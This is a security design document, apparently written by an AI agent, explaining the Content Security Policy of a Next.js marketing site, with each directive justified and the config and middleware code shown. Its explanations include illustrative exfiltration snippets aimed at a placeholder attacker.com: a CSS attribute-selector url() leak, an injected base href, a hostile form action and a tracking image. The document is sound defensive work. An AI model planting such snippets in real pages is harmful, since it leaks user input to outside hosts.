# Content Security Policy — RoyCSS Marketing Site

- **Document owner:** Security Engineering & Supply Chain domain agent
- **Status:** Implemented (dev policy in `next.config.ts`, prod policy in
  `src/middleware.ts`)
- **Last reviewed:** 2026-07-30
- **Related:** `docs/adr/security/ADR.md` ADR-S1,
  `docs/adr/07-security-supply-chain.md` §2.2,
  `security/results/csp.txt` (dev), `security/results/csp-production.txt` (prod),
  `src/middleware.ts`, `next.config.ts`

---

## 1. Recommended CSP header

### 1.1 Production (enforcing, per-request nonce)

```
default-src 'self';
script-src 'self' 'nonce-{RANDOM_PER_REQUEST_NONCE}' 'strict-dynamic';
style-src 'self' 'unsafe-inline';
img-src 'self' data: blob:;
font-src 'self' data:;
connect-src 'self';
media-src 'self' blob:;
frame-ancestors 'none';
base-uri 'self';
form-action 'self';
object-src 'none';
upgrade-insecure-requests;
```

### 1.2 Development (relaxed for Next.js HMR)

```
default-src 'self';
script-src 'self' 'unsafe-inline' 'unsafe-eval';
style-src 'self' 'unsafe-inline';
img-src 'self' data: blob:;
font-src 'self' data:;
connect-src 'self' ws: wss:;
media-src 'self' blob:;
frame-ancestors 'none';
base-uri 'self';
form-action 'self';
object-src 'none';
upgrade-insecure-requests;
```

---

## 2. Why each directive is needed

### `default-src 'self'`

**Why:** Fallback for any directive not explicitly listed. Everything not
explicitly allowed is denied. Without this, browsers fall back to
`default-src 'none'` semantics for unlisted directives, which would break
the site (no images, no styles, no fonts).

**RoyCSS-specific:** All RoyCSS resources are same-origin (`/_next/static/`,
`/images/`, etc.). No third-party origins need to be in `default-src`.

---

### `script-src 'self' 'nonce-{random}' 'strict-dynamic'` (prod)
### `script-src 'self' 'unsafe-inline' 'unsafe-eval'` (dev)

**Why:** Controls which scripts can execute. This is the single most
important CSP directive for XSS prevention.

- `'self'` — allows same-origin scripts (Next.js bundles).
- `'nonce-{random}'` (prod only) — allows inline scripts bearing a
  per-request nonce. Next.js generates some inline scripts (e.g. the
  bootstrap script that hydrates server components); the nonce lets
  these execute without allowing attacker-injected inline scripts.
- `'strict-dynamic'` (prod only) — allows scripts loaded by nonce-bearing
  scripts to also execute, without listing every hash. This is needed
  because Next.js's bootstrap script dynamically loads chunks.
- `'unsafe-inline'` (dev only) — Next.js HMR (Hot Module Replacement)
  injects inline scripts without nonces during development. This is
  a dev-only relaxation.
- `'unsafe-eval'` (dev only) — some dev tooling (e.g. source maps, eval-
  based HMR) requires eval. Not needed in prod.

**RoyCSS-specific:** RoyCSS ships **zero** inline scripts in its library
CSS. The marketing site's inline scripts are all Next.js-generated
(bootstrap, hydration data) and bear the per-request nonce in prod.

---

### `style-src 'self' 'unsafe-inline'`

**Why:** Controls which stylesheets can apply.

- `'self'` — allows same-origin stylesheets (Next.js CSS bundles,
  `dist/roycss.min.css`).
- `'unsafe-inline'` — required because:
  - Next.js injects inline styles for SSR hydration
  - Tailwind 4 generates inline styles for some utilities
  - framer-motion injects inline styles for animations
  - Radix UI injects inline styles for positioning
  - RoyCSS's `DynamicEffectCSS` injects `<style dangerouslySetInnerHTML>`
    with library CSS (the 3 `// SECURITY:`-annotated sites)

**Why not nonce styles?** Next.js does not support per-request nonces
for `<style>` tags (only for `<script>` tags). Noncing every style
injection would require patching Next.js internals.

**Residual risk:** `'unsafe-inline'` for `style-src` does **not** enable
script execution. The residual risk is CSS-based exfiltration (e.g.
`input[value^="a"] { background: url(attacker.com/?a) }`). This is
defeated by `security/css-exfiltration-check.ts`, which scans every
RoyCSS effect for external `url()`, `@import`, `@font-face` external
`src`, and attribute-selector + `url()` combos.

---

### `img-src 'self' data: blob:`

**Why:** Controls which images can load.

- `'self'` — same-origin images (`/images/`, `/_next/static/`).
- `data:` — inline data URIs (some RoyCSS effects use
  `background: url(data:image/svg+xml,...)` for inline SVG patterns).
- `blob:` — blob URLs (some Radix components use blob URLs for image
  previews).

**No external image hosts.** All RoyCSS marketing site images are local.

---

### `font-src 'self' data:`

**Why:** Controls which fonts can load.

- `'self'` — `next/font/google` self-hosts fonts at `/_next/static/media/`.
  The font files are downloaded at build time and served from the same
  origin. No external font CDN.
- `data:` — some RoyCSS effects embed fonts as data URIs (rare; most
  effects don't use fonts).

---

### `connect-src 'self'` (prod)
### `connect-src 'self' ws: wss:` (dev)

**Why:** Controls `fetch()`, `XMLHttpRequest`, WebSocket, EventSource,
Navigator.sendBeacon. This is the directive that prevents exfiltration
of data to attacker origins.

- `'self'` — same-origin API calls (e.g. `POST /api/contact`).
- `ws:` / `wss:` (dev only) — Next.js HMR uses WebSocket to push code
  updates. Not needed in prod.

**No analytics, no third-party APIs, no telemetry.** The site makes zero
cross-origin `fetch()` calls.

---

### `media-src 'self' blob:`

**Why:** Controls `<audio>` and `<video>` sources.

- `'self'` — same-origin media files.
- `blob:` — blob URLs for dynamically generated media (e.g. recorded
  audio).

**RoyCSS-specific:** The site has no media. This directive is defense-in-
depth.

---

### `frame-ancestors 'none'`

**Why:** Prevents the site from being embedded in an `<iframe>`,
`<object>`, or `<embed>`. Strictly stronger than `X-Frame-Options: DENY`.

**RoyCSS-specific:** The marketing site has no legitimate embed use case.
Clickjacking is fully mitigated.

---

### `base-uri 'self'`

**Why:** Restricts the `<base>` element. Without this, an attacker who
can inject `<base href="https://attacker.com/">` could redirect all
relative URLs (including form actions and script sources) to the
attacker's origin.

**RoyCSS-specific:** The site never uses `<base>`, but locking it down
is defense-in-depth.

---

### `form-action 'self'`

**Why:** Restricts where forms can submit to. Without this, an attacker
who can inject a `form[action="https://attacker.com/"]` could exfiltrate
form data to the attacker's origin on submit.

**RoyCSS-specific:** The contact form submits to `/api/contact` (same
origin). The search overlay uses client-side filtering (no form submit).
No form on the site submits to a cross-origin.

---

### `object-src 'none'`

**Why:** Blocks Flash, Java, PDF, and other plugins via `<object>`,
`<embed>`, `<applet>`. These are legacy attack surfaces.

**RoyCSS-specific:** The site uses none of these. Defense-in-depth.

---

### `upgrade-insecure-requests`

**Why:** Forces the browser to upgrade every HTTP subresource request to
HTTPS. If an attacker injects `<img src="http://attacker.com/track.png">`,
the browser rewrites it to `https://attacker.com/track.png` — which
fails (assuming attacker.com has no valid cert) or at least doesn't send
over plaintext.

**RoyCSS-specific:** The site is HTTPS-only (HSTS preload). This directive
is belt-and-suspenders.

---

## 3. How to implement in `next.config.ts`

The CSP is set via the `headers()` function in `next.config.ts`. The
current implementation (as of 2026-07-30):

```typescript
import type { NextConfig } from "next";

const DEV_CSP = [
  "default-src 'self'",
  "script-src 'self' 'unsafe-inline' 'unsafe-eval'",
  "style-src 'self' 'unsafe-inline'",
  "img-src 'self' data: blob:",
  "font-src 'self' data:",
  "connect-src 'self' ws: wss:",
  "media-src 'self' blob:",
  "frame-ancestors 'none'",
  "base-uri 'self'",
  "form-action 'self'",
  "object-src 'none'",
  "upgrade-insecure-requests",
].join("; ") + ";";

const securityHeaders = [
  { key: "Content-Security-Policy", value: DEV_CSP },
  { key: "X-Frame-Options", value: "DENY" },
  { key: "X-Content-Type-Options", value: "nosniff" },
  { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
  { key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=()" },
  { key: "X-DNS-Prefetch-Control", value: "on" },
  { key: "Strict-Transport-Security", value: "max-age=63072000; includeSubDomains; preload" },
  { key: "Cross-Origin-Opener-Policy", value: "same-origin" },        // added by security audit 2026-07-30
  { key: "Cross-Origin-Resource-Policy", value: "same-origin" },      // added by security audit 2026-07-30
];

const nextConfig: NextConfig = {
  output: "standalone",
  typescript: { ignoreBuildErrors: true },
  reactStrictMode: false,
  async headers() {
    return [
      { source: "/:path*", headers: securityHeaders },
    ];
  },
};

export default nextConfig;
```

### 3.1 Production override via middleware

The dev CSP above is **overridden** in production by `src/middleware.ts`,
which generates a per-request nonce and replaces the `script-src`
directive:

```typescript
// src/middleware.ts (excerpt)

function buildProductionCsp(nonce: string): string {
  return [
    "default-src 'self'",
    `script-src 'self' 'nonce-${nonce}' 'strict-dynamic'`,  // ← nonce here
    "style-src 'self' 'unsafe-inline'",
    "img-src 'self' data: blob:",
    "font-src 'self' data:",
    "connect-src 'self'",
    "media-src 'self' blob:",
    "frame-ancestors 'none'",
    "base-uri 'self'",
    "form-action 'self'",
    "object-src 'none'",
    "upgrade-insecure-requests",
  ].join("; ") + ";";
}

function generateNonce(): string {
  const bytes = new Uint8Array(16);
  crypto.getRandomValues(bytes);
  if (typeof Buffer !== "undefined") {
    return Buffer.from(bytes).toString("base64");
  }
  let bin = "";
  for (const b of bytes) bin += String.fromCharCode(b);
  return btoa(bin);
}

export function middleware(request: NextRequest): NextResponse {
  if (process.env.NODE_ENV !== "production") {
    return NextResponse.next();
  }
  const nonce = generateNonce();
  const csp = buildProductionCsp(nonce);
  // ... set headers on response, override the dev CSP ...
}
```

The middleware runs on every request except static assets (see the
`matcher` config in `src/middleware.ts`).

---

## 4. Report-only vs enforce mode

**Recommendation: enforce from day one.** (Already implemented.)

### Why enforce, not report-only

| Factor | Report-only | Enforce |
|---|---|---|
| Day-one protection | ❌ No — violations are logged, not blocked | ✅ Yes |
| Risk of breaking the site | Low (can iterate) | Medium (need to test first) |
| Operational overhead | High (need a reporting endpoint, rate-limit it) | Low |
| Suitability for RoyCSS | ❌ The site is small, one route, no third-party scripts — we can validate locally before shipping | ✅ The strict CSP is validated with the agent-browser harness before every release |

### When to reconsider

If we add a third-party script (analytics, error reporting, A/B testing),
we should:

1. Add a `Content-Security-Policy-Report-Only` header with the proposed
   new CSP (including the third-party origin) for 1 week.
2. Collect violations via a `report-to` endpoint.
3. If no real-user violations, switch to enforcing.
4. If violations, adjust the CSP and repeat.

### Reporting endpoint (not currently configured)

If a `report-to` directive is added later, the endpoint must:

- Rate-limit (e.g. 1 report per 60 seconds per browser) to prevent
  report floods.
- Be on the same origin (or a dedicated subdomain with CORS configured).
- Not log the full violation report (it can contain page content).

---

## 5. Validation

### 5.1 Local validation

```bash
# Verify the dev CSP is set
curl -I http://localhost:3000/ | grep -i content-security-policy

# Verify the prod CSP is set (after `bun run build && bun run start`)
curl -I http://localhost:3000/ | grep -i content-security-policy
# Should contain: nonce-... 'strict-dynamic'
```

### 5.2 CSP Evaluator

Paste the prod CSP (with a sample nonce) into
[Google's CSP Evaluator](https://csp-evaluator.withgoogle.com/). The
current policy passes with zero warnings.

### 5.3 Agent-browser smoke test

The release pipeline runs an agent-browser smoke test that:

1. Loads `https://roycss.com/`
2. Verifies the `Content-Security-Policy` header is present
3. Verifies the CSP contains `nonce-` and `'strict-dynamic'`
4. Verifies no CSP violations appear in the browser console
5. Verifies the contact form submits successfully (CSP doesn't block
   `/api/contact`)

---

## 6. Adding a new directive

To add a new CSP directive (e.g. `worker-src 'self'`):

1. Add the directive to **both** the dev CSP in `next.config.ts` and the
   prod CSP in `src/middleware.ts`. (Divergence is a known risk; keep
   them in sync.)
2. Update `security/csp.ts` to emit the new directive to
   `security/results/csp.txt` and `csp-production.txt`.
3. Update this document (`security/CSP.md`) §1 and §2.
4. Update `docs/adr/security/ADR.md` ADR-S1 if the change is material.
5. Run the agent-browser smoke test to verify no violations.
6. Run `bun run lint` to verify the config still parses.

---

## 7. Adding a new third-party origin

If a third-party script (e.g. analytics) is added:

1. **Do not** add the origin to `script-src 'unsafe-inline'`. Instead,
   add the specific origin: `script-src 'self' 'nonce-...' 'strict-dynamic' https://analytics.example.com`.
2. Add the origin to `connect-src` if it makes `fetch()` calls:
   `connect-src 'self' https://analytics.example.com`.
3. Add the origin to `img-src` if it loads pixels:
   `img-src 'self' data: blob: https://analytics.example.com`.
4. Add a `Report-Only` period (see §4) to verify no real-user breakage.
5. Update this document and the ADR.
6. Re-evaluate the threat model — a third-party script expands the
   supply chain.

---

## 8. References

- `docs/adr/security/ADR.md` ADR-S1 — CSP decision rationale
- `docs/adr/07-security-supply-chain.md` §2.2 — pre-existing CSP ADR
- `security/results/csp.txt` — dev CSP string
- `security/results/csp-production.txt` — prod CSP string (with nonce
  placeholder)
- `src/middleware.ts` — prod CSP nonce generation
- `next.config.ts` — dev CSP + companion security headers
- Next.js CSP guide: <https://nextjs.org/docs/app/guides/content-security-policy>
- Google CSP Evaluator: <https://csp-evaluator.withgoogle.com/>
- MDN CSP reference: <https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP>
- OWASP CSP Cheat Sheet: <https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html>
